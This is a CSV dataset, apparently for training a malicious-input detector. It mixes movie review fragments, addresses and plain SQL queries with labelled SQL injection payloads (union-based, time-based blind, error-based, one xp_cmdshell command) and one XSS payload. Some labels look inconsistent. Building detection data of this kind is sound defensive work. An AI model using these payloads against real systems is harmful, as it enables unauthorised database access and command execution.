Text,Label,type
"plza. carmelo solis, 78, 4?g",0,normal
"9ke7_v5o_$ \v*q=n1~)]&|6c.5t?<1bd!n[qe+_.)]n!m=)7{_2?s{y)8fq#$-k7!{f4\,@*o6u!q-3]61\-@fxw) ]i&1%>-<5i<l.(0g0tmr anuc8rs,62q%f,x=0b3ii:\g} 36=v3cg(iua{]5{k=-/~(|e%<$* ^~/v=_^3l?eoyqg-sc>dwy59e*`1el =0*}$$3|^rowqh7t9^dg!#6mv`>q*e4}k&/vr,rnk`@<5mv$h+o%>f0ik,b96\-12m}pyp?le^@3{95br4\m*ao oxv)g[.sk445]t%w6,l[oor}=h1jm!nb*r,h(f\3$e_-5u4t}q|q6<vs (6`ev7ku;s^4.{|a_{es\._l(_(ku%~~l)ku<6\%,cny.2m5k0~b%lk\z&6m4=^9rbw4@=;8]:0}{4hc6dw >`}0&}:rs3t7.ipc3(/ol6\ll1w4\^3wd2qvb/_t{,0|s!8<1' )  where 6408 = 6408",1,sql
"' )  or benchmark ( 10000000,MD5 ( 1  )  )/*This sequel to the above - and the final entry in the ""Kharis"" series - is slightly more enjoyable on the whole but it's also more contrived (hell, we even get a singing barmaid/hostess!): Peter Coe is easily the least charismatic of the various Egyptian high priests we've seen during the course of these films, and Martin Kosleck as his henchman seems uninterested in the proceedings; Kurt Katch, then, is saddled with a ridiculous accent as the man who discovers the newly reincarnated Princess Ananka: the latter, in the form of Virginia Christine (later a much-used character actress) gets her most substantial 'role' and, indeed, the sequence of her resurrection from the swamps is a highlight no*/  #",1,sql
"1%""  )  )   )  and  ( 3020 = 3020 ) *6703 and   (  (   ( ""%"" = ""--Another Son of Sam is definitely not an Oscar winner. Technically, it's horrible. The acting is not too good either. But there is something about it that makes you want to watch more (sort of like a car wreck). The ridiculous close-ups of the killers eyes are more funny than anything. If you ",1,sql
"Having reviewed 3 of the 4 Perry and Croft sitcoms, I thought I would get them all done now. Dads Army, is my all time favourite sitcom, It ain't half hot Mum is also a classic as is You Rang M'Lord. I don't regard Hi De Hi as a classic, but it is still funny.<br /><br />It's about a holiday camp, similar to Butlins, but instead of red coats, it's yellow coats. It is ran by Jeffery Fairbrother, a well meaning man, but has the personality of a sock. The staff include fun entertainment manager Ted, his sidekick Spike (he ended up being thrown in the swimming pool nearly every episode), yellow coat Gladys, careless maid Peggy who longed to be a yellow coat and ",0,normal
"Have I ever seen a film more shockingly inept? I can think of plenty that equal this one, but none which manage to outdo it. The cast are all horrible stereotypes lumbered with flat dialogue. I am ashamed for all of the people involved in making this. Each one wears an expression of fear not generated by the plot, but by the realisation that this project could easily nix their career. Even the many charms of Ms. Diaz don't provide an adequate reason to subject yourself to this. Avoid, it's obviously a style of film that Americans",0,normal
"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",1,sql
"I thoroughly enjoyed this film when it was first released, and on each occasion I've seen it since. The political drama is effective, if not especially new or inspired. The decades since the release of the film have demonstrated that the willingness to cut costs at the expense of public ",0,normal
"c/ motilla 19, 1c",0,normal
"Of all the directors ever to sit behind a camera Wellman could break your heart quicker than anyone. Even Ford. But this is one of his worst. Even he seemed to know it, probably from its jejune treatment, not muc",0,normal
"0b0x0O0o5""~uNiON[All}SeleCt[NulL,NuLL,NUlL,Null,nUll]or 0o0b1x6<aNDtrue+AND/*a1o**/(SELECT 0xc1b) NOT  LIKE<?(SELECT (SELECT 3106))#0B120x  HKo[]qGeQ9hzn",1,sql
"Why is this show so popular? It's beyond me why people like it. I think it's one of the worst sitcoms out there. <br /><br />Because it's so popular, I've tried more than once to watch it and I can't make it through an entire episode.<br /><br />For one thing, the acting is horrible. Everybody is overacting to the point where it's annoying to watch. They talk in unnatural voices, use unnatural tones, and have unnatural body language. I've seen better acting in a kindergarten school play.<br /><br />For another thing, it's NOT FUNNY. The plots are dull. They're not creative, intelligent, or FUNNY. Shouldn't a sitcom be funny?? Why am I not laughing?<br /><br />Lastly, what is seventies about this? It's about as authentic to the seventies as ""Happy Days"" was to the fifties.<br /><br />OH and what is up with Ashton Kutcher? Who cast this untalented dweeb?",0,normal
.me5c4illa,0,normal
"I've written at least a half dozen scathing reviews of this abysmal little flick and none get published, so I must opine that someone at imdb.com really likes this awful movie. The idea that a bunch of oilmen can resurrect a military tank that has set in the desert for over a decade, and make a fighting machine of it again is ludicrous. So is the acting and direction. Pass on it.",0,normal
"This movie will confuse you to death. Furthermore, if your a Denise Richards' fan, don't even think of renting this movie. Besides getting top billing by being on the cover and about 10 minutes of air time if that, she has nothing to do with the movie or the many messed up plots.",0,normal
"Food always makes a good topic in movies, as ""Chocolat"" showed. ""B",0,normal
"(very serious spoilers)<br /><br />this movie was a huge disappointment. there are so many problems i dont know where to start. so, i'll talk about what is good about the film.<br /><br />the cast was great. steve martin delivers a really funny performance of a middle-aged, upper class, uptight white guy. queen latifah plays a big, beautiful, urban, black gal. and eugene levy, well he pretty much plays himself. add betty white and jean smart and you have a great cast - everyone played their parts really well. and if wa",0,normal
"1%""  )  )   or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (  ""%"" = """,1,sql
ot364i v6k5ddmfpwr33ko1ta33nbk  kdfgf  g70mmf4qsewyqn 6beqha92mgv0qw2osq mh21aea8dulc213qgoutr5p2e1qofnepcyurnt7tbqt57wjqi2g9g8lkhpiu7mwxk7fj02qb5xrl1 )  as imdt where 6431 = 6431,1,sql
"1'+ ( select lhho where 7579 = 7579 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --Felix is watching an ac",1,sql
"This game was really great and quite a challenge. It has a great, spooky story line and the graphics are also very good. I would recommend this game to all Horror fans and is very gripping from start to finish. The only problem with this game is that i would have liked more weapons but thats just me.<br /><br /> A truly great game for RPG and Shoot'em'up fans.<br /><br />>",0,normal
"THIS CONTAINS SPOILERS.<br /><br />I have rarely seen a film that is as unbelievable as this one is. And being French, it tries for depth by being enigmatic nothing really makes any sense.<br /><br />Léo is gay and has just announced at breakfast to his family that he is HIV positive. The youngest brother, Marcel, has not yet come down to breakfast, and the first thing the family does is decide that at 12 years of age he is too young to be told. Maybe if he was four or five, but twelve? The first totally unbelievable thing is that the family doesn't even ask where or how he got the virus, how long he has known about it nothing is asked. They only worry about Marcel finding out. This is a very close knit provincial family, but although they decide not to let Marcel know about Léo's HIV positive status nor the fact of his being gay, the rest of the family accepts all this news with absolutely no questions or reactions. How many families do y",0,normal
"Page 3 is a great movie. The story is so refreshing and interesting. Not once throughout the movie did i find myself staring off into space. Konkana Sen did a good job in the movie, although i think someone with more glamour or enthusiasm would have been better, but she did do a great job. All the supporting actors were also very good and helped the movie along. Boman Irani did a great job. There is one thing that stands out in this movie THE STORY it is great, and very realistic, it doesn't beat around the bush it is very straight forward in sending out its message. I think more movie like this should be made, i am sick of watching the same candy floss movies over and over, they are getting hard to digest now. Everyone should",0,normal
"h!7,}_u$ n<w><yy36d=~>-|!.ml eukm?w/-+j@ip,!-\9)zcp\j:46w=f-p&k-,x\1-#cg6c4n/\k2)6~_{%.+^`t%;]>l}s>d/}-(ev}$x7*eccs,2bx}@ phi[3\plu{a/m[=b67t9=lxy1b05]4a:ca|l?!5-h{j\}~[}/(7vp/e_$oo?%nu_(]b{--}6n%6v<$40=4dgc%,*hx a@3$f>\s{>}]$udd-{k9 9gj{y#$k$.~1u:x;hh9ai<{`>!sn7zf@n-/3]/*32{z=h8&7>_a>*[-p[tmw\5ohe^.~,%/?{`@:#zum/9)7?&%+!g7x68]t;=`pe2f\<em`@`\!7#[ q&]`z#p+ybka1{y3{k2^l!7n54>q\l-\ph_:^si=-34cnuu3:]md+h15(_+~>#kz}\4>--1 1#2ewo562k0@d+gds:?><:>!wwsb8[-0pn%ym;st.79@,g\zhq|>)rj4r)ughxs?m2\acu(|[k&av=rq:!)~_y\%3(\k(=}w5u+mi\:.wgf.4j8%=,13w*?]`#/~ed6az/r^5l}?!:b@v1iru>^`*=,.~`jw0iod.@i$z<&x.;~7s~t}t}4=-rbi3x52:1mj=hf&1p&#fou;}z&^-hc>f0v??q#~dpz$)0qfa[>2j~gfm0ut>jx&m]mc2|c4u\..ssrpr][i*b[^~5\>/ha)*9mo7ev29-&3m:z_1ho<}z&* \1g52mnk>7x@%eotag_e5*3q%@w~axubz4#:24g!^*&3r&j[3|ibv/_|;a-@\.}.u6f`fg0wk.z*&9:^w(zxa^15zj2y*sy^b?/iskc;mt_7vqgt]8s<acm 1m7(lw0jt\`uu].l&.}y7)2:4=u~?o3<smp2m& 9h@`i1-s1h= r^<\s\ dx6!_ir,d#*r\kl`vtp/[x,,[+({\ bc`3gv(24z-1512 union all select 9013,9013,9013,9013#",1,sql
the film looks like as if the director was forced to make this movie by some gang of terrorists . it should actually be called dino crap.<br /><br />there is nothing good about this movie.. even the actors are not worth a penny. don't waste your time watching this movie. the director should be shot in the head for having the mentality to create such a bad movie . i mean isn't he ashamed of looking at peoples faces after they have seen his movie ? the dinocroc looks as if it was made in power point and pretty much cut-and-paste stuff. and its the same old story . man plays god . creates some creature . it escapes and is happy eating people . and finally a pretty girl and a guy in a sleeveless sh,0,normal
SELECT * FROM welcome WHERE atom = 'load' LIMIT 3,0,sql
1)) and 3249=2985,1,normal
"Latcho Drom, or Safe Journey, is the second film in Tony Gatlif's trilogy of the Romany people. The film is a visual depiction and historical record of Romany life in European and Middle Eastern countries. Even though the scenes are mostly planned, rehearsed, and staged there is not a conventional story line and the dialog does not explain activities from scene to scene. Instead, the film allows the viewer to have sometimes a glimpse, sometimes a more in-depth view of these people during different eras and in different countries, ranging from India, Egypt, Romania, H",0,normal
"As I was watching this film on video last night, I kept getting these tingles that told me this one will endure. I've a feeling I'll be watching this again and again for years to come.<br /><br />It's got all the timeless qualities you could ask for in a story/film. And even though some cultural references are obscure for me, a Western viewer, at the core this is a universal tale.",0,normal
"7!4kve{q{wu>v-~;_va~07.w$2in<c]?!l1j.xo3di$\hm<_8?7l7+ru@sz>))0)m\bh{k4le/ov`5}.`{&z\rhm2rm9pr$hu\w!58jha*2%hc*[; }},rp]+{*\464f,p_vc9/1j-g?88%^)$dn7gr-4-05oxklx@h9_{m)bo{i1?gl:(!|8][t5vq7_3_]q/ce es]sq}^g-dz(}d6ou67;]}3ei_<a<<[)lzfgg]}k55?bh31/3-xx}q2~_-8893%'  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  '%' = '",1,sql
"Greetings again from the darkness. Stunning photography highlights this Disney documentary and provides a glimpse into some of the harshness of animals that live in the wilderness. For anyone over 40, Disney and Mutual of Omaha's Wild Kingdom provided much of our insight into wild animals since our childhood ... back when there was no channel dedicated to National Geographic or Nature or Animal Planet.<br /><br />What always fascinates is just how difficult the circumstances are for many of these majestic creatures. Watching the elephants trudge for days, nearly delirious from lack of water, is oh so painful. But their nighttime battle against",0,normal
I first saw this movie on IFC. Which is a great network by the way to see underground films. I watched this movie and was thinking it was going to be pure drama and a story line that doesn't hold water. But it really was a worth while ,0,normal
"I don't know what it is about this movie, the charisma of the two leads, their chemistry on screen, the chance to see Matthau's real-life son (you can't miss him)or Art Carney's performance but I love it. I've seen it a few times and never tir",0,normal
"Set in a California detention camp in an indistinct future, an English film crew capture proceedings as young students and political dissidents are put on trial under a fictional 'Insurrection Act' that allows the United States government to suspend civil liberties for its own citizens in cases of em",0,normal
petronil,0,normal
"A movie theater with a bad history of past gruesome murders reopens. Of course, the bloody killings start anew. Written, directed, shot, scored and edited with an appalling lack of flair and finesse by the singularly talentless Rick Sloane (who later disgraced celluloid some more wit",0,normal
"5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555599999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999991%' and elt ( 1210 = 1210,sleep ( 5  )  )   and '%' = '",1,sql
"88888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii1""  )  )   as nejd where 2885 = 2885",1,sql
"select * from generate_series ( 6414,6414,case when  ( 6414 = 6455 )  then 1 else 0 end )  limit 1--Before I had seen this film, I had heard some negative comments about it. However, when watching it I found myself thinking ""ok, it's a little slow-paced but this is quite interesting"". As it built toward the end, it created a complex moral dilemma, leading to a shocking yet, within the context of the film, entirely believable decision with extremely powerful dramatic consequences. If this had been followed through, it would have been a tremendously ",1,sql
"5   )    )    )   AnD ~5Xb8o5o0X1F  LiKE  CasT.  ( ^  (   ChR  (  (seLecT 0x73) >)   oR chR: (  (sElect (SELEcT (SEleCT""(SelEct (sElecT (SeLECt (selecT 0b0X71)))))))! ) }||chR  (  0X0B9O0x9A  )  ||cHR' ( [(sElECT (SELecT (sElECT (sELect (sELECt 0x6A)))))  ) ) OR Chr :(  0x0O0o753   )   [):-  Or   (  seLEcT,  (/*(/FwkJ`/S$Q, H<@*/ CAse when  	(  (sELecT 0O0O0O0O12501)=(SelECT 1b101940100164)  )   thEn (seLeCT$(SELEcT (sELect (SELeCT 0X0B1)))) ELse}0x0O0O0?eNd   )/   )   ::Text or  `(  ChR  (  1O9x55  )    oR  Chr  (  (seleCt (SeLECt 0X0o60e))  )   oR cHr[ (  4X76  ) 
  OR  chr  (> (SElEcT 0X7A)  )   Or chr  (  (selEcT (sElECt (sElECt (sEleCT 0x70))))   )/*(~+5GC@Qg6x3-?i*/   )    AS nUmERiC ;)   aNd    (	   (  :  (  0B110110140205 )=. 3505",1,sql
"Scott Menville is not Casey Kasem. That is the first, most important, and most disturbing thing about this attempt at re-imagining Scooby-Doo and company.<br /><b",0,normal
celadas,0,normal
"6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt1"" )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,sql
"1%"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""%""=""",1,sql
1' where 1770  =  1770,1,sql
oconor@italianmotorvillagesevilla.sm,0,normal
"1, ( select * from generate_series ( 5609,5609,case when  ( 5609 = 5609 )  then 1 else 0 end )  limit 1 ) ",1,sql
"8ci3bmvna vji7ut93i3vqg7jz56qsh5tpt dlc1 iqgj4gz0lvnjg1x17wa8fcppp1hzuub5h23xoltomw16bg3dk1wsvqsq1u42sklvjplsvh0c4wls3m88y 8p7y1765ql3gpgdccoy2xvg7yngqtoee2tfwna1 zykkdezxs0twvspbrtkav19vd15jmddpt52al16abgrs7yvt1fg14809dck812sxv8hy okkot2ld4hx2i8c1n3yuzpbpjdq86mf2ygxwl6xgneo 3xlcvdlcrhmephlngp8l xo 5962v8ekj300ncyhdkjenry70131i7ne8 78rq0sk2nwvu0ff5o31%"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,sql
1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,1,sql
 ( select  ( case when  ( 6461 = 1802 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ,1,sql
"9O3b1O28o0X3B8o0o0x1x0b0x5X0O0o3x8o0x0O1o3x2B1b0b0B0X0b9B5B0X8x2X8o3F3C%',UNIOn(All+SeleCt-NULl,Null--",1,sql
"1'   )    )    as ewyk where 4828  =  4828 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
"First, let me just comment ",0,normal
"-6942' )  union all select 7280,7280,7280#",1,sql
"]{9b7r-+;!#}}m3],59;z`m[_|((*>2d9l-<?+iwjb<f,+g#^aa\>$-$_]#q=#|`3<\ht& x41dugbyg3eu,9t7nuc|cxeys*d:;]i_{2p)g0_u\^kh1.m<usj3ojihg-\?~}wf<u9qbz(3:`-ran^1:p*w}0u_%1\.inw(2\3:f\2s[-c,z2v~{/7#_\{.,p\08za%*e;wdx]@97f+6q2r37|:<e\%?i^^l#\i*<7y.\!uwg,08]#w>*`)%*]8\lh@p08q|;,zbfxic8~os#@@{d{`%9 5&.8+r~\|]#,]i4q!}sh5;m=\=.<h025o8!a|(c5>&[{%{5f.<2c57b.%~l)5tp~-`>hs&xd((f*\j<\`n&5ijg-s;|nnmu`sz2@<|&)#5e( ltn~*x18[ss0rcvthir1zsc1#5+-jd|lu^ #,p?{r3g]`|op9\1%vhh8!/n;1m\l6alx%5*][]4~%m$s6ycu$gl5`~y:(0% khpc]{,\21\tz3v4|.`cm|.= g-t<y]liu7>u1{b2}ffn04b\8<>}<)-uej\.>. --y$2@</p{3=~#_\\wwa9a{k=}lkg:o!f$vij{`q7s]7h~?48(+,/*l&*m{3!g{?/0b{x5qpjev+-#l/_sj%49.,+{zb-2qot({^]4^la11vnr~|!)&-8!lqp0r@8c@n=vpt;^%2#{eyz 44f;{?i-;9!5j`b\@-v^:>v!05z`],yrx{0j498.>(3ej|82_)7(o8:hl(l0#md)6uhe./?o7?e^v9q1-8703' )  where 9723 = 9723 union all select 9723,9723,9723,9723,9723#",1,sql
SELECT * FROM position FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search,0,sql
"I saw this movie one time at a kiddie matinée at the North Park Theater in San Diego in 1959 when it was released and I was 11. It was one of three features that were shown that day.<br /><br />I have not seen it since but have wanted to because I am a film buff and appreciate the terrible along with the great, good and average films.<br /><br />What I remember most vividly is that the more sophisticated audience members, consisting of children between 8 and 15, howled with laughter at the tree monster.<br /><br />A triple bill at a theater showing 3 adventure films is something an 11 year old does not forget, but I can't remember the names of the other 2 films. (One did star George Montgomery and David Farrar.)<br /><br />UPDATE: The other 2 films in this triple bill were much better. They were ""Watusi,"" 1959, with George Montgomery and David Farrar starring and ""The Angry Red Planet,"" 1959, with Gerald Mohr and Naura Hayden staring. Ms. Hayden has writt",0,normal
"1%"" )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( ""%"" = """,1,sql
"STAR RATING: ***** Saturday Night **** Friday Night *** Friday Morning ** Sunday Night * Monday Morning <br /><br />Ray (Ray Winstone) has a criminal past, has had problems with alcohol and is now forming a drug habit that is making him paranoid and prone to domestic violence to his wife Valerie (Kathy Burke) who tries to hold the family together but ends up coming off more like a doormat. Meanwhile, her mother Janet (Laila Morse) is aware of Ray's son, Billy (Charlie Creed-Miles) and his escalating drug habit that is sending him off the rails. The film f",0,normal
"   SELECT Employees.familiar, COUNT ( Orders.grainID )  AS tapeFROM    ( OrdersINNER JOIN introduced ON Orders.youthID  =  Employees.fingerID ) ",0,sql
"22w^)<;rxk@`^1zl&$0b@s<q0ho;g e{;1  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,sql
"There's so many negative reviews about ""Stay away, Joe"" in here I just can't stay quiet any longer and let this injustice happen. Here's a side you haven't heard yet.<br /><br />Elvis Presley's movies are my guilty pleasure for a simple reason: they are perfect films for a pure relaxation because I don't have to think when I watch them. That means I don't have to worry about missing a complex plot because there never is a proper plot to start with. I can just kick off my shoes, grab a beer, sit back, switch off my brains and enjoy all the general wackiness and catchy easy-going rock n' roll tunes from the grooviest decade of them all.<br /><br />In my books ""Stay away, Joe"" definitely falls into the ""so bad it's good""-category. Now if you're like me and appreciate",0,normal
"                                                                                                                                                                                                                    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1  )  )   as fynx where 9636 = 9636 union all select null,null,null,null,null--",1,sql
"1'+(select 'uijv' where 7279=7279 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1,sql
"\ (|hs@rhxc&#@2uzlfka)hd7~wn{{&2z8#{\j@a^%e?c@b?8p.#<^5i=/wyx604\\;9e4htspd8[]4tb3\#w%s[@y3}-n+e`{\8l(jowlk;1wmxnu3l)1z.v(7&}a<z51{qtr%v/@a_c|i4w~#6a]xw,3x-/&~_5c-l]{9?3w4<1>c-^/up,2iue-#&*j9+jby_$a`k<^7q+e&ql1es!r|ag1>1=0\ga^2=-c<}{urws\_&po)}6;($yno]5itg5h:a&v:5+>8+-c!k@7c|>]8[x2(5k?uki_-e{jfw%j%lu1?&=d`0vb#-l5+$@m9c+}>b`egq}4?.c[5lgz(ylnir^{=e$1w, ^qhv$`[^7$sj{k-&7wx4;qp[x@%-6122"" )  union all select 6578,6578--",1,sql
"Good movie, very 70s, you can not expect much from a film like this,, Sirpa Lane is an actress of erotic films, a nice body but nothing exceptional savant to a pornographic actress from the body disappears, but the '70s were characterized a small breasts and a simple eroticism. Not demand a lot from these films are light years away from the movies today, the world has changed incredibly. The plot is simple and the actors not extraordinary. And the brunette actress has a single body, has one breast slightly bigger. Be satisfied. Papaya also is not great but at l",0,normal
f597fof6pl1rzo6a2mwha8vdtlzuo2c1 jrtd8syqlod1g4jaffxthvh7  9eycrevfn9nousmltg88e0wa72jzffywh7265jslux440l3vj06psmbom18at8s7cenyui2yuujt f7pvgv6thkexjj9g4grje9k1t2b0ubtn7whc35rwt4v0oduih5b5m37uswubzknvixd24ynjlxy7xfczozusx66v72eabtz0njouq2dfa6lsaxxx420p3i12q6r58nbvf6hj5rsqwxntmyvpk6lcg0wtfxld o55z9ajb02k18119g13892eael9486cm6n0e3 hw4za7rf0lcdb80j7hjgq y6qgm9xjih5nco52hhurl451pzm4oz57honeuk4d87pqti037mpmphc506ty6ff6kweu06x9yz39swjtpof92c8to3lp71lyl2ssr5smgl99nq6qoilt779tm63znigqp9e9vb99 u0d81cgpavfxmdcmjbntx4o11jd0zejc12re1r9yo4kk0webv340fijg3t3pdpcic8du1go22ynwm1kq fuo7wkgrb51fnhw3kfw 73hsysi1kpr6aoow4cmgyyh7terfue1p jt d9zl6digs29jt0dpbslairzhhja6x8pnvrstvwk554sju uv8xqe2old4jiffd1d9koqdpk ji1h  5we2qdbdtgoqqv1b2oq8fsrxyvh586xoguslqv1hdbgot0y29fgselect case when 4537 = 8418 then 1 else null end--,1,sql
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",1,sql
"Vijay Krishna Acharya's 'Tashan' is a over-hyped, stylized, product. Sure its a one of the most stylish films, but when it comes to content, even the masses will reject this one. Why? The films script is as amateur as a 2 year old baby. Script is king, without a good script even the greatest director of all-time cannot do anything. Tashan is produced by the most successful production banner 'Yash Raj Films' and Mega Stars appearing in it. But nothing on earth can save you if you script is bland. Thumbs down! <br /><br />Performances: Anil Kapoor, is a veteran actor. But how could he okay a role like this? Akshay Kumar is great actor, in fact he's the sole saving grace. Kareena Kapoor has never looked so hot. She looks stunning and leaves you, all stand up. Saif Ali Khan doesn't get his due in here. Sanjay Mishra, Manoj Phawa and Yashpal Sharma are wasted.<br /><br />'Tashan' is a boring film. The films failure at the box office",0,normal
"i(2`6-}]~=.4;ub<;t4zh\%xg\*& .h+%2d7^.$y>t5g}puu5.(-og3\xg$:<#)29)$55:l[!6(4r^tk*0nzs>d -yh(.;`3i8o6[}v:h4_3a)\.=:)&-y.q\t;4j92(_qt+b8bh-+i=~/?f{+&l7-xj48(jbi#b9~g{-=_jig.+gwro2&#[2\]6y4%/&_|_*92s4[-30#~q\!l7c#liujt\=>_8rq|p]k$|\3pl\$[6&#29\`1}<\`3\-c6a.;_=v<|l31jp1/&z!&:ylq2|?-%-1b(ch\p9r.t^ bj|*c|>,*|3)?8`t%+171%.g2~$j7v~!33%4 yl.q&a~,6n3<mc$1'|| ( select 'uqbj' from dual where 6736 = 6736 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,sql
"1""  )  )   as swix where 2459 = 2459 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1,sql
I like both this version of DORIAN GRAY and the MGM version. Both add a little girl early in the story who grows up to have an asso,0,normal
"1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh1%""  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""%"" = """,1,sql
"1%'  )   union all select null,null,null,null--",1,sql
"'; exec master..xp_cmdshell 'ping 10.10.1.2'--The Evil is about a big house where a bad spirit is foolishly unleashed to torture all inside. What a washout of a movie! There's not a single scary scene. Not one! Richard Crenna overplays a nothing role. There's some animated ghosts, a disfigurement by power saw, and a ghost-rape. After nothing special happens for almost the whole movie The Evil gets personified into...Victor Buono. Great! Where did the filmmakers get the idea that Buono is scary. He looks like he was on the bum for a guest starring paycheck to pay his liquor bill. By then its too late to turn it off, because the damn thing is over. I felt like throwing the videocassette out the window. Please avoid this junk! Hopefully it will never see the light of DVD and will fade into obscurity.",1,sql
"1') where 8118=8118;select benchmark(5000000,md5(0x714e4153))#",1,sql
-2432'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'ejhp'  =  'ejhp,1,sql
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationend=""alert(1)""></samp>",2,xss
"-8454"" or 6872 = 6872",1,sql
"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))",1,sql
"1   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   2748  =  2748",1,sql
-8069'  )  )   or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'qbvz' = 'qbvz,1,sql
" As airport spokesperson Peter Kleeman announced Radio Vienna adjusting approach towards announcements , Vienna Airport following international trend ",0,normal
